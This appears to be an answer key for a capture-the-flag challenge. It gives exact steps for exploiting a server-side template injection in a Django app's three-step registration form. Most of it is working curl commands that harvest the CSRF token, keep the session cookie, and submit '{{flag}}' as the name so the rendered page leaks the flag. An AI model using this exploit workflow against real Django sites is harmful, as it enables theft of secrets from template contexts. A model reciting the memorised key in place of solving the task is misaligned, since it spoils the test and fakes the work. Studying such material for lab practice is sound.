# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Django SSTI via the multi-step registration "name" field. The app
does a raw Python `.replace('ACCOUNTNAME', name)` on the template SOURCE before
compiling it, so Django template syntax in `name` executes. The render context
already includes the flag as `{{ flag }}`, so injecting `{{flag}}` as the name
prints it — no RCE gadget needed. Registration is 3 steps and needs the CSRF
token + session cookie carried through.

1. **Step 1** — GET the step1 page, extract the `csrfmiddlewaretoken`, then POST
   `name={{flag}}` and any password (reuse one cookie jar):

   ```
   curl -s -c cookies.txt -b cookies.txt http://<target>/accounts/register/step1/ -o step1.html
   CSRF=$(grep -o 'csrfmiddlewaretoken[^>]*value="[^"]*"' step1.html | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/accounts/register/step1/ \
     -H "Referer: http://<target>/accounts/register/step1/" \
     --data-urlencode "csrfmiddlewaretoken=$CSRF" \
     --data-urlencode "name={{flag}}" --data-urlencode "password=SuperSecret123"
   ```

2. **Step 2** — same pattern, submit any email:

   ```
   curl -s -c cookies.txt -b cookies.txt http://<target>/accounts/register/step2/ -o step2.html
   CSRF2=$(grep -o 'csrfmiddlewaretoken[^>]*value="[^"]*"' step2.html | grep -o 'value="[^"]*"' | head -1 | cut -d'"' -f2)
   curl -s -c cookies.txt -b cookies.txt -X POST http://<target>/accounts/register/step2/ \
     -H "Referer: http://<target>/accounts/register/step2/" \
     --data-urlencode "csrfmiddlewaretoken=$CSRF2" --data-urlencode "email=attacker@example.com"
   ```

3. **Step 3** — a GET triggers the vulnerable template compile/render; your
   `{{flag}}` executes:

   ```
   curl -s -c cookies.txt -b cookies.txt http://<target>/accounts/register/step3/
   ```

4. **Extract the flag** (`FLAG{...}`) from the rendered page and report it
   verbatim.
